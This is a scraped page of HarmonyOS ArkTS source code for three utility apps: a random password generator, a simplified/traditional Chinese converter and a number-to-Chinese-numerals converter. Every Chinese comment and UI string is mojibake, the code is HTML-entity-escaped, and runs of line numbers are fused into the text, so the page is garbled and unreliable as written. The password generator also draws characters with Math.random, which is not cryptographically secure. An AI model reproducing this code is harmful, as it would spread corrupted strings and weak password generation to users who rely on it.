å­—ä½“é¢œè‰² @State fontColor: string = &quot;#2e2e2e&quot;; // ç”Ÿæˆå¯†ç çš„æ–¹æ³• generatePassword() &#123; let characterSet = &#x27;&#x27;; // åˆå§‹åŒ–å­—ç¬¦é›†åˆ // éå†æ‰€æœ‰é€‰é¡¹ï¼Œå¦‚æœé€‰é¡¹è¢«é€‰ä¸­åˆ™åŠ å…¥å­—ç¬¦é›†åˆ for (let option of this.options) &#123; if (option.selected) &#123; characterSet += option.characters &#125; &#125; let password = &#x27;&#x27;; // åˆå§‹åŒ–å¯†ç å­—ç¬¦ä¸² // æ ¹æ®å¯†ç é•¿åº¦ç”Ÿæˆéšæœºå¯†ç  for (let i = 0; i &lt; this.passwordLength; i++) &#123; const randomIndex = Math.floor(Math.random() * characterSet.length); password += characterSet[randomIndex]; &#125; this.generatedPassword = password; // æ›´æ–°ç”Ÿæˆçš„å¯†ç  &#125; // å¤åˆ¶åˆ°å‰ªè´´æ¿çš„æ–¹æ³• copyToClipboard(text: string) &#123; const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // åˆ›å»ºå‰ªè´´æ¿æ•°æ® const systemPasteboard = pasteboard.getSystemPasteboard(); // è·å–ç³»ç»Ÿå‰ªè´´æ¿ systemPasteboard.setData(pasteboardData); // å°†æ•°æ®æ”¾å…¥å‰ªåˆ‡æ¿ promptAction.showToast(&#123; message: &#x27;å·²å¤åˆ¶&#x27; &#125;); // æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º &#125; // æ£€æŸ¥é€‰é¡¹é€‰æ‹©çŠ¶æ€çš„æ–¹æ³• checkOptionsSelection() &#123; let selectedCount = 0; // è®°å½•å·²é€‰ä¸­çš„é€‰é¡¹æ•°é‡ let lastSelectedIndex = 0; // è®°å½•æœ€åä¸€ä¸ªé€‰ä¸­çš„é€‰é¡¹ç´¢å¼• // éå†æ‰€æœ‰é€‰é¡¹ for (let i = 0; i &lt; this.options.length; i++) &#123; this.options[i].enabled = true; // é»˜è®¤å¯ç”¨æ‰€æœ‰é€‰é¡¹ if (this.options[i].selected) &#123; lastSelectedIndex = i; // æ›´æ–°æœ€åä¸€ä¸ªé€‰ä¸­çš„é€‰é¡¹ç´¢å¼• selectedCount++; // å¢åŠ é€‰ä¸­è®¡æ•° &#125; &#125; // å¦‚æœåªæœ‰ä¸€ä¸ªé€‰é¡¹è¢«é€‰ä¸­ï¼Œåˆ™ç¦ç”¨è¯¥é€‰é¡¹é˜²æ­¢å…¶è¢«å–æ¶ˆé€‰ä¸­ if (selectedCount === 1) &#123; this.options[lastSelectedIndex].enabled = false; &#125; &#125; // æ„å»ºé¡µé¢å¸ƒå±€çš„æ–¹æ³• build() &#123; Column() &#123; // æ ‡é¢˜æ  Text(&quot;éšæœºå¯†ç ç”Ÿæˆ&quot;) .width(&#x27;100%&#x27;)// è®¾ç½®å®½åº¦ä¸º100% .height(54)// è®¾ç½®é«˜åº¦ä¸º54 .fontSize(18)// è®¾ç½®å­—ä½“å¤§å° .fontWeight(600)// è®¾ç½®å­—ä½“ç²—ç»† .backgroundColor(Color.White)// è®¾ç½®èƒŒæ™¯é¢œè‰² .textAlign(TextAlign.Center)// è®¾ç½®æ–‡æœ¬å±…ä¸­å¯¹é½ .fontColor(this.fontColor); // è®¾ç½®å­—ä½“é¢œè‰² // å¯†ç é•¿åº¦è®¾ç½®éƒ¨åˆ† Column() &#123; Row() &#123; Text(`å¯†ç é•¿åº¦ï¼š`)// å¯†ç é•¿åº¦æ ‡ç­¾ .fontWeight(600) .fontSize(18) .fontColor(this.fontColor); Text(`$&#123;this.passwordLength&#125;`)// æ˜¾ç¤ºå½“å‰å¯†ç é•¿åº¦ .fontWeight(600) .fontSize(18) .fontColor(this.primaryColor); &#125; .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx` &#125;); // æ»‘åŠ¨æ¡è®¾ç½®å¯†ç é•¿åº¦ Row() &#123; Text(&#x27;4&#x27;).fontColor(this.fontColor).width(20); Slider(&#123; value: this.passwordLength, // å½“å‰å€¼ min: 4, // æœ€å°å€¼ max: 32, // æœ€å¤§å€¼ style: SliderStyle.InSet // æ»‘åŠ¨æ¡æ ·å¼ &#125;) .layoutWeight(1)// å¸ƒå±€æƒé‡ .blockColor(Color.White)// æ»‘å—é¢œè‰² .trackColor(&#x27;#EBEBEB&#x27;)// è½¨é“é¢œè‰² .trackThickness(30)// è½¨é“åšåº¦ .blockSize(&#123; width: 55, height: 55 &#125;)// æ»‘å—å¤§å° .selectedColor(this.primaryColor)// é€‰ä¸­é¢œè‰² .onChange((value: number, mode: SliderChangeMode) =&gt; &#123; this.passwordLength = value; // æ›´æ–°å¯†ç é•¿åº¦ console.info(&#x27;value:&#x27; + value + &#x27;mode&#x27; + mode.toString); // æ‰“å°æ—¥å¿— &#125;); Text(&#x27;32&#x27;).fontColor(this.fontColor).width(20); &#125;.margin(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing&#125;lpx`, &#125;); // é€‰é¡¹è®¾ç½®éƒ¨åˆ† Text(&#x27;é€‰é¡¹&#x27;) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;); // åŠ¨æ€ç”Ÿæˆæ¯ä¸ªé€‰é¡¹çš„UIå…ƒç´  ForEach(this.options, (option: PasswordOption, index: number) =&gt; &#123; Row() &#123; Text(option.name)// é€‰é¡¹åç§° .fontWeight(400) .fontSize(16) .fontColor(this.fontColor) .layoutWeight(1); Toggle(&#123; type: ToggleType.Switch, isOn: option.selected &#125;)// åˆ‡æ¢æŒ‰é’® .width(&#x27;100lpx&#x27;) .height(&#x27;50lpx&#x27;) .enabled(option.enabled)// æ˜¯å¦å¯ç”¨åˆ‡æ¢ .selectedColor(this.primaryColor) .onChange((isOn: boolean) =&gt; &#123; option.selected = isOn; // æ›´æ–°é€‰é¡¹çŠ¶æ€ this.checkOptionsSelection(); // æ£€æŸ¥é€‰é¡¹é€‰æ‹©çŠ¶æ€ &#125;); &#125; .width(&#x27;100%&#x27;) .padding(&#123; left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, top: `$&#123;this.baseSpacing / 3&#125;lpx`, bottom: `$&#123;this.baseSpacing / 3&#125;lpx` &#125;) .hitTestBehavior(HitTestMode.Block) .onClick(() =&gt; &#123; if (option.enabled) &#123; option.selected = !option.selected; // åˆ‡æ¢é€‰é¡¹çŠ¶æ€ &#125; &#125;); &#125;); // ç”Ÿæˆå¯†ç æŒ‰é’® Text(&#x27;ç”Ÿæˆå¯†ç &#x27;) .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.baseSpacing * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;)// ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; this.generatePassword(); // ç”Ÿæˆå¯†ç  &#125;); &#125; .width(&#x27;650lpx&#x27;) .margin(&#123; top: 20 &#125;) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // æ˜¾ç¤ºç”Ÿæˆçš„å¯†ç  Column() &#123; Text(`å¯†ç ç»“æœï¼š`) .fontWeight(600) .fontSize(18) .fontColor(this.fontColor) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, &#125;); Text(`$&#123;this.generatedPassword&#125;`)// æ˜¾ç¤ºç”Ÿæˆçš„å¯†ç  .width(&#x27;650lpx&#x27;) .fontColor(this.primaryColor) .fontSize(18) .textAlign(TextAlign.Center) .padding(&#123; left: 5, right: 5 &#125;) .margin(&#123; top: `$&#123;this.baseSpacing / 3&#125;lpx` &#125;); // å¤åˆ¶æŒ‰é’® Text(&#x27;å¤åˆ¶&#x27;) .enabled(this.generatedPassword ? true : false)// åªæœ‰ç”Ÿæˆäº†å¯†ç æ‰å¯ç”¨å¤åˆ¶æŒ‰é’® .fontColor(Color.White) .backgroundColor(this.primaryColor) .height(54) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.baseSpacing * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx`, left: `$&#123;this.baseSpacing&#125;lpx`, right: `$&#123;this.baseSpacing&#125;lpx`, bottom: `$&#123;this.baseSpacing&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; &#123; this.copyToClipboard(this.generatedPassword); // å¤åˆ¶å¯†ç  &#125;); &#125; .width(&#x27;650lpx&#x27;) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.baseSpacing&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); &#125; .height(&#x27;100%&#x27;) .width(&#x27;100%&#x27;) .backgroundColor(&quot;#f2f3f5&quot;); // é¡µé¢èƒŒæ™¯é¢œè‰² &#125;&#125; chineseohpm install @nutpi&#x2F;chinese_transverter 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191// å¯¼å…¥å¿…è¦çš„è½¬æ¢åº“ï¼Œæä¾›ç®€ä½“ä¸ç¹ä½“ä¹‹é—´çš„è½¬æ¢åŠŸèƒ½import &#123; transverter, TransverterType, TransverterLanguage &#125; from &quot;@nutpi/chinese_transverter&quot;;// å¯¼å…¥å‰ªè´´æ¿æœåŠ¡ï¼Œç”¨äºå°†æ–‡æœ¬å¤åˆ¶åˆ°ç³»ç»Ÿå‰ªè´´æ¿import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;;// å¯¼å…¥æç¤ºæœåŠ¡ï¼Œç”¨äºå‘ç”¨æˆ·æ˜¾ç¤ºæ¶ˆæ¯import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // ä½¿ç”¨@Entryè£…é¥°å™¨æ ‡è®°æ­¤ç»„ä»¶ä¸ºåº”ç”¨çš„å…¥å£ç‚¹@Entry // ä½¿ç”¨@Componentè£…é¥°å™¨å®šä¹‰ä¸€ä¸ªåä¸ºSimplifiedTraditionalConverterçš„ç»„ä»¶@Componentstruct SimplifiedTraditionalConverter &#123; // å®šä¹‰çŠ¶æ€å˜é‡inputTextï¼Œå­˜å‚¨ç”¨æˆ·è¾“å…¥çš„åŸå§‹æ–‡æœ¬ï¼Œå½“å…¶å€¼å˜åŒ–æ—¶è§¦å‘onInputTextChangedæ–¹æ³• @State @Watch(&#x27;onInputTextChanged&#x27;) inputText: string = &#x27;&#x27;; // å®šä¹‰çŠ¶æ€å˜é‡simplifiedResultï¼Œå­˜å‚¨è½¬æ¢åçš„ç®€ä½“ç»“æœ @State simplifiedResult: string = &#x27;&#x27;; // å®šä¹‰çŠ¶æ€å˜é‡traditionalResultï¼Œå­˜å‚¨è½¬æ¢åçš„ç¹ä½“ç»“æœ @State traditionalResult: string = &#x27;&#x27;; // å®šä¹‰çŠ¶æ€å˜é‡isInputFocusedï¼Œè¡¨ç¤ºè¾“å…¥æ¡†æ˜¯å¦è·å¾—äº†ç„¦ç‚¹ @State isInputFocused: boolean = false; // å®šä¹‰ä¸»é¢˜é¢œè‰² @State private themeColor: string = &#x27;#439fff&#x27;; // å®šä¹‰æ–‡æœ¬é¢œè‰² @State private textColor: string = &quot;#2e2e2e&quot;; // å®šä¹‰åŸºç¡€å†…è¾¹è·å¤§å° @State private basePadding: number = 30; // å®šä¹‰æœ€å°æ–‡æœ¬åŒºåŸŸé«˜åº¦ @State private minTextAreaHeight: number = 50; // å®šä¹‰æœ€å¤§æ–‡æœ¬åŒºåŸŸé«˜åº¦ @State private maxTextAreaHeight: number = 300; // å½“inputTextçŠ¶æ€æ”¹å˜æ—¶è§¦å‘çš„æ–¹æ³•ï¼Œç”¨äºæ›´æ–°è½¬æ¢ç»“æœ onInputTextChanged() &#123; // å°†inputTextè½¬æ¢ä¸ºç®€ä½“ï¼Œå¹¶æ›´æ–°simplifiedResult this.simplifiedResult = transverter(&#123; type: TransverterType.SIMPLIFIED, str: this.inputText, language: TransverterLanguage.ZH_CN &#125;); // å°†inputTextè½¬æ¢ä¸ºç¹ä½“ï¼Œå¹¶æ›´æ–°traditionalResult this.traditionalResult = transverter(&#123; type: TransverterType.TRADITIONAL, str: this.inputText, language: TransverterLanguage.ZH_CN &#125;); &#125; // å°†ç»™å®šçš„æ–‡æœ¬å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼Œå¹¶æ˜¾ç¤ºæç¤ºä¿¡æ¯ private copyToClipboard(text: string): void &#123; const clipboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // åˆ›å»ºå‰ªè´´æ¿æ•°æ® const systemClipboard = pasteboard.getSystemPasteboard(); // è·å–ç³»ç»Ÿå‰ªè´´æ¿ systemClipboard.setData(clipboardData); // è®¾ç½®å‰ªè´´æ¿æ•°æ® promptAction.showToast(&#123; message: &#x27;å·²å¤åˆ¶åˆ°å‰ªè´´æ¿&#x27; &#125;); // æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º &#125; // æ„å»ºç»„ä»¶çš„UI build() &#123; Scroll() &#123; // åˆ›å»ºå¯æ»šåŠ¨çš„å®¹å™¨ Column() &#123; // åœ¨æ»šåŠ¨å®¹å™¨ä¸­åˆ›å»ºå‚ç›´å¸ƒå±€ // åˆ›å»ºæ ‡é¢˜æ–‡æœ¬ Text(&quot;ç®€ä½“ç¹ä½“è½¬æ¢å™¨&quot;) .width(&#x27;100%&#x27;) .height(54) .fontSize(18) .fontWeight(600) .backgroundColor(Color.White) .textAlign(TextAlign.Center) .fontColor(this.textColor); // åˆ›å»ºç”¨æˆ·è¾“å…¥åŒºåŸŸ Column() &#123; // åˆ›å»ºå¤šè¡Œæ–‡æœ¬è¾“å…¥æ¡† TextArea(&#123; text: $$this.inputText, placeholder: &#x27;è¯·è¾“å…¥ç®€ä½“/ç¹ä½“å­—ï¼ˆæ”¯æŒæ··åˆè¾“å…¥ï¼‰&#x27; &#125;) .fontSize(18) .placeholderColor(this.isInputFocused ? this.themeColor : Color.Gray) .fontColor(this.isInputFocused ? this.themeColor : this.textColor) .borderColor(this.isInputFocused ? this.themeColor : Color.Gray) .caretColor(this.themeColor) .onBlur(() =&gt; this.isInputFocused = false) // å½“è¾“å…¥æ¡†å¤±å»ç„¦ç‚¹æ—¶ï¼Œæ›´æ–°isInputFocusedçŠ¶æ€ .onFocus(() =&gt; this.isInputFocused = true) // å½“è¾“å…¥æ¡†è·å¾—ç„¦ç‚¹æ—¶ï¼Œæ›´æ–°isInputFocusedçŠ¶æ€ .borderWidth(1) .borderRadius(10) .backgroundColor(Color.White) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;); // åˆ›å»ºæ¸…ç©ºæŒ‰é’® Text(&#x27;æ¸…ç©º&#x27;) .borderWidth(1) .borderColor(this.themeColor) .fontColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) // æ·»åŠ ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; this.inputText = &quot;&quot;); // æ¸…ç©ºè¾“å…¥æ¡† &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .margin(&#123; top: 20 &#125;) .backgroundColor(Color.White) .borderRadius(10) .alignItems(HorizontalAlign.Start); // åˆ›å»ºç¹ä½“ç»“æœå±•ç¤ºä¸å¤åˆ¶åŒºåŸŸ Column() &#123; // åˆ›å»ºç¹ä½“ç»“æœæ ‡é¢˜ Text(`ç¹ä½“ç»“æœï¼š`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // åˆ›å»ºç¹ä½“ç»“æœå±•ç¤ºæ–‡æœ¬ Text(`$&#123;this.traditionalResult&#125;`) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin(&#123; top: `$&#123;this.basePadding / 3&#125;lpx` &#125;); // åˆ›å»ºå¤åˆ¶ç¹ä½“ç»“æœæŒ‰é’® Text(&#x27;å¤åˆ¶&#x27;) .enabled(this.traditionalResult ? true : false) // åªæœ‰å½“æœ‰ç¹ä½“ç»“æœæ—¶ï¼ŒæŒ‰é’®æ‰å¯ç”¨ .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; this.copyToClipboard(this.traditionalResult)); // å¤åˆ¶ç¹ä½“ç»“æœåˆ°å‰ªè´´æ¿ &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); // åˆ›å»ºç®€ä½“ç»“æœå±•ç¤ºä¸å¤åˆ¶åŒºåŸŸ Column() &#123; // åˆ›å»ºç®€ä½“ç»“æœæ ‡é¢˜ Text(`ç®€ä½“ç»“æœï¼š`) .fontWeight(600) .fontSize(18) .fontColor(this.textColor); // åˆ›å»ºç®€ä½“ç»“æœå±•ç¤ºæ–‡æœ¬ Text(`$&#123;this.simplifiedResult&#125;`) .constraintSize(&#123; minHeight: this.minTextAreaHeight, maxHeight: this.maxTextAreaHeight &#125;) .fontColor(this.themeColor) .fontSize(18) .textAlign(TextAlign.Start) .copyOption(CopyOptions.InApp) .margin(&#123; top: `$&#123;this.basePadding / 3&#125;lpx` &#125;); // åˆ›å»ºå¤åˆ¶ç®€ä½“ç»“æœæŒ‰é’® Text(&#x27;å¤åˆ¶&#x27;) .enabled(this.simplifiedResult ? true : false) // åªæœ‰å½“æœ‰ç®€ä½“ç»“æœæ—¶ï¼ŒæŒ‰é’®æ‰å¯ç”¨ .fontColor(Color.White) .backgroundColor(this.themeColor) .height(50) .textAlign(TextAlign.Center) .borderRadius(10) .fontSize(18) .width(`$&#123;650 - this.basePadding * 2&#125;lpx`) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .clickEffect(&#123; level: ClickEffectLevel.HEAVY, scale: 0.8 &#125;) .onClick(() =&gt; this.copyToClipboard(this.simplifiedResult)); // å¤åˆ¶ç®€ä½“ç»“æœåˆ°å‰ªè´´æ¿ &#125; .width(&#x27;650lpx&#x27;) .padding(`$&#123;this.basePadding&#125;lpx`) .backgroundColor(Color.White) .borderRadius(10) .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) .alignItems(HorizontalAlign.Start); &#125; &#125; .width(&#x27;100%&#x27;) .height(&#x27;100%&#x27;) .backgroundColor(&quot;#f2f3f5&quot;) .align(Alignment.Top) .padding(&#123; bottom: `$&#123;this.basePadding&#125;lpx` &#125;); &#125;&#125; Up Loweræ•°å­—è½¬ä¸­æ–‡å¤§å°å†™ 12ohpm install @nutpi/chinese-finance-numberohpm install @nutpi/chinese-number-format 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199// å¯¼å…¥å¿…è¦çš„æ¨¡å—import &#123; promptAction &#125; from &#x27;@kit.ArkUI&#x27;; // ç”¨äºæ˜¾ç¤ºæç¤ºä¿¡æ¯import &#123; pasteboard &#125; from &#x27;@kit.BasicServicesKit&#x27;; // ç”¨äºå¤„ç†å‰ªè´´æ¿æ“ä½œimport &#123; toChineseNumber &#125; from &#x27;@nutpi/chinese-finance-number&#x27;; // å°†æ•°å­—è½¬æ¢ä¸ºä¸­æ–‡å¤§å†™é‡‘é¢import &#123; toChineseWithUnits, // å°†æ•°å­—è½¬æ¢ä¸ºå¸¦å•ä½çš„ä¸­æ–‡ toUpperCase, // å°†ä¸­æ–‡å°å†™è½¬æ¢ä¸ºå¤§å†™&#125; from &#x27;@nutpi/chinese-number-format&#x27;; @Entry // æ ‡è®°æ­¤ç»„ä»¶ä¸ºå…¥å£ç‚¹@Component // å®šä¹‰ä¸€ä¸ªç»„ä»¶struct NumberToChineseConverter &#123; @State private exampleNumber: number = 88.8; // ç¤ºä¾‹æ•°å­— @State private textColor: string = &quot;#2e2e2e&quot;; // æ–‡æœ¬é¢œè‰² @State private lineColor: string = &quot;#d5d5d5&quot;; // åˆ†å‰²çº¿é¢œè‰² @State private basePadding: number = 30; // åŸºç¡€å†…è¾¹è· @State private chineseLowercase: string = &quot;&quot;; // è½¬æ¢åçš„å°å†™ä¸­æ–‡ @State private chineseUppercase: string = &quot;&quot;; // è½¬æ¢åçš„ä¸­æ–‡å¤§å†™ @State private chineseUppercaseAmount: string = &quot;&quot;; // è½¬æ¢åçš„ä¸­æ–‡å¤§å†™é‡‘é¢ @State @Watch(&#x27;inputChanged&#x27;) private inputText: string = &quot;&quot;; // ç›‘å¬è¾“å…¥æ–‡æœ¬å˜åŒ– // å½“è¾“å…¥æ–‡æœ¬æ”¹å˜æ—¶è§¦å‘çš„æ–¹æ³• inputChanged() &#123; this.chineseLowercase = toChineseWithUnits(Number(this.inputText), &#x27;zh-CN&#x27;); // è½¬æ¢ä¸ºå°å†™ä¸­æ–‡å¹¶å¸¦ä¸Šå•ä½ this.chineseUppercase = toUpperCase(this.chineseLowercase, &#x27;zh-CN&#x27;); // å°†å°å†™ä¸­æ–‡è½¬æ¢ä¸ºå¤§å†™ this.chineseUppercaseAmount = toChineseNumber(Number(this.inputText)); // è½¬æ¢ä¸ºå¤§å†™é‡‘é¢ &#125; // å¤åˆ¶æ–‡æœ¬åˆ°å‰ªè´´æ¿çš„æ–¹æ³• private copyToClipboard(text: string): void &#123; const pasteboardData = pasteboard.createData(pasteboard.MIMETYPE_TEXT_PLAIN, text); // åˆ›å»ºå‰ªè´´æ¿æ•°æ® const systemPasteboard = pasteboard.getSystemPasteboard(); // è·å–ç³»ç»Ÿå‰ªè´´æ¿ systemPasteboard.setData(pasteboardData); // è®¾ç½®å‰ªè´´æ¿æ•°æ® promptAction.showToast(&#123; message: &#x27;å·²å¤åˆ¶&#x27; &#125;); // æ˜¾ç¤ºå¤åˆ¶æˆåŠŸçš„æç¤º &#125; // æ„å»ºç”¨æˆ·ç•Œé¢çš„æ–¹æ³• build() &#123; Column() &#123; // ä¸»åˆ—å®¹å™¨ // é¡µé¢æ ‡é¢˜ Text(&#x27;æ•°å­—è½¬ä¸­æ–‡å¤§å°å†™&#x27;) .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .height(50) // è®¾ç½®é«˜åº¦ .textAlign(TextAlign.Center) // æ–‡æœ¬å±…ä¸­å¯¹é½ .backgroundColor(Color.White) // è®¾ç½®èƒŒæ™¯é¢œè‰² .shadow(&#123; // æ·»åŠ é˜´å½±æ•ˆæœ radius: 2, // é˜´å½±åŠå¾„ color: this.lineColor, // é˜´å½±é¢œè‰² offsetX: 0, // Xè½´åç§»é‡ offsetY: 5 // Yè½´åç§»é‡ &#125;); Scroll() &#123; // æ»šåŠ¨è§†å›¾ Column() &#123; // å†…éƒ¨åˆ—å®¹å™¨ // å·¥å…·ä»‹ç»éƒ¨åˆ† Column() &#123; Text(&#x27;å·¥å…·ä»‹ç»&#x27;).fontSize(20).fontWeight(600).fontColor(this.textColor); // è®¾ç½®ä»‹ç»æ–‡å­—æ ·å¼ Text(&#x27;å°†æ•°å­—è½¬æ¢ä¸ºä¸­æ–‡æ ¼å¼ï¼Œé€‚ç”¨äºç¥¨æ®å¡«å†™ã€åˆåŒæ–‡ä¹¦ã€è´¢åŠ¡æŠ¥è¡¨ç­‰å¤šç§åœºæ™¯ã€‚æ”¯æŒä»æœ€å°å•ä½â€œåˆ†â€åˆ°æœ€å¤§å•ä½â€œåƒå…†â€çš„æ•°å­—è½¬æ¢ã€‚&#x27;) .textAlign(TextAlign.JUSTIFY) .fontSize(18).fontColor(this.textColor).margin(&#123; top: `$&#123;this.basePadding / 2&#125;lpx` &#125;); // è®¾ç½®ä»‹ç»è¯¦æƒ…æ–‡å­—æ ·å¼ &#125; .alignItems(HorizontalAlign.Start) // å¯¹é½æ–¹å¼ .width(&#x27;650lpx&#x27;) // è®¾ç½®å®½åº¦ .padding(`$&#123;this.basePadding&#125;lpx`) // è®¾ç½®å†…è¾¹è· .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // è®¾ç½®å¤–è¾¹è· .borderRadius(10) // è®¾ç½®åœ†è§’ .backgroundColor(Color.White) // è®¾ç½®èƒŒæ™¯é¢œè‰² .shadow(&#123; // æ·»åŠ é˜´å½±æ•ˆæœ radius: 10, // é˜´å½±åŠå¾„ color: this.lineColor, // é˜´å½±é¢œè‰² offsetX: 0, // Xè½´åç§»é‡ offsetY: 0 // Yè½´åç§»é‡ &#125;); // è¾“å…¥åŒº Column() &#123; Row() &#123; // è¡Œå®¹å™¨ Text(&#x27;ç¤ºä¾‹&#x27;) .fontColor(&quot;#5871ce&quot;) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .padding(`$&#123;this.basePadding / 2&#125;lpx`) // è®¾ç½®å†…è¾¹è· .backgroundColor(&quot;#f2f1fd&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.inputText = `$&#123;this.exampleNumber&#125;`; // è®¾ç½®è¾“å…¥æ¡†æ–‡æœ¬ä¸ºç¤ºä¾‹æ•°å­— &#125;); Blank(); // å ä½ç¬¦ Text(&#x27;æ¸…ç©º&#x27;) .fontColor(&quot;#e48742&quot;) // è®¾ç½®å­—ä½“é¢œè‰² .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .padding(`$&#123;this.basePadding / 2&#125;lpx`) // è®¾ç½®å†…è¾¹è· .clickEffect(&#123; level: ClickEffectLevel.LIGHT, scale: 0.8 &#125;) // è®¾ç½®ç‚¹å‡»æ•ˆæœ .backgroundColor(&quot;#ffefe6&quot;) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(5) // è®¾ç½®åœ†è§’ .onClick(() =&gt; &#123; // ç‚¹å‡»äº‹ä»¶ this.inputText = &quot;&quot;; // æ¸…ç©ºè¾“å…¥æ¡† &#125;); &#125;.height(45) // è®¾ç½®é«˜åº¦ .justifyContent(FlexAlign.SpaceBetween) // å­å…ƒç´ æ°´å¹³åˆ†å¸ƒæ–¹å¼ .width(&#x27;100%&#x27;); // è®¾ç½®å®½åº¦ Divider().margin(&#123; top: 5, bottom: 5 &#125;); // åˆ†å‰²çº¿ TextInput(&#123; text: $$this.inputText, placeholder: `è¯·è¾“å…¥æ•°å­—ï¼Œä¾‹å¦‚ï¼š$&#123;this.exampleNumber&#125;` &#125;) // è¾“å…¥æ¡† .width(&#x27;100%&#x27;) // è®¾ç½®å®½åº¦ .fontSize(18) // è®¾ç½®å­—ä½“å¤§å° .caretColor(this.textColor) // è®¾ç½®å…‰æ ‡é¢œè‰² .fontColor(this.textColor) // è®¾ç½®å­—ä½“é¢œè‰² .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // è®¾ç½®å¤–è¾¹è· .padding(0) // è®¾ç½®å†…è¾¹è· .backgroundColor(Color.Transparent) // è®¾ç½®èƒŒæ™¯é¢œè‰² .borderRadius(0) // è®¾ç½®åœ†è§’ .type(InputType.NUMBER_DECIMAL); // è®¾ç½®è¾“å…¥ç±»å‹ä¸ºæ•°å­— &#125; .alignItems(HorizontalAlign.Start) // å¯¹é½æ–¹å¼ .width(&#x27;650lpx&#x27;) // è®¾ç½®å®½åº¦ .padding(`$&#123;this.basePadding&#125;lpx`) // è®¾ç½®å†…è¾¹è· .margin(&#123; top: `$&#123;this.basePadding&#125;lpx` &#125;) // è®¾ç½®å¤–è¾¹è· .borderRadius(10) // è®¾ç½®åœ†è§’ .backgroundColor(Color.White) // è®¾ç½®èƒŒæ™¯é¢œè‰² 